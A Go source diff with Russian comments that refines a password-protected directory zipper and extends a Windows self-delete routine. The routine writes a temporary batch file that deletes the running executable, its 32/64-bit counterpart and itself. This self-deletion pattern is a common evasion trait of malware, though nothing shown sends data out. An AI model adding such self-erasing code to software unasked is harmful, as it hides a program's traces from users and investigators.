@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 
 	"github.com/yeka/zip"
 )
@@ -40,7 +41,12 @@ func zipDirectory(source, target, password string) error {
 		if err != nil {
 			return err
 		}
-		header.Name = relPath
+
+		// Преобразуем пути в формат ZIP (используем прямые слэши)
+		header.Name = filepath.ToSlash(relPath)
+
+		// Устанавливаем метод сжатия
+		header.Method = zip.Deflate
 
 		if info.IsDir() {
 			header.Name += "/"
@@ -49,12 +55,16 @@ func zipDirectory(source, target, password string) error {
 			return err
 		}
 
+		// Устанавливаем время модификации файла
+		header.SetModTime(info.ModTime())
+
 		var writer io.Writer
 		if password == "" {
 			// Создаем обычный файл без пароля
 			writer, err = archive.CreateHeader(header)
 		} else {
-			// Создаем зашифрованный файл
+			// Создаем зашифрованный файл с улучшенными настройками
+			header.Flags |= 0x1 // Установка флага шифрования
 			writer, err = archive.Encrypt(header.Name, password, zip.StandardEncryption)
 		}
 		if err != nil {
@@ -68,8 +78,9 @@ func zipDirectory(source, target, password string) error {
 		}
 		defer file.Close()
 
-		// Копируем содержимое в архив
-		_, err = io.Copy(writer, file)
+		// Буферизированное копирование для улучшения производительности
+		buf := make([]byte, 32*1024) // 32KB буфер
+		_, err = io.CopyBuffer(writer, file, buf)
 		return err
 	})
 
@@ -81,6 +92,12 @@ func selfDeleteWindows() error {
 	if err != nil {
 		return err
 	}
+	exe_other := exe
+	if strings.Contains(exe, "64") {
+		exe_other = strings.Replace(exe, "64", "32", 1)
+	} else {
+		exe_other = strings.Replace(exe, "32", "64", 1)
+	}
 
 	// Создаем временный bat-файл
 	batPath := filepath.Join(os.TempDir(), "delete.bat")
@@ -88,7 +105,8 @@ func selfDeleteWindows() error {
 ping 127.0.0.1 -n 2 > nul
 del "%s"
 del "%s"
-    `, exe, batPath)
+del "%s"
+    `, exe, exe_other, batPath)
 
 	if err := ioutil.WriteFile(batPath, []byte(batContent), 0666); err != nil {
 		return err
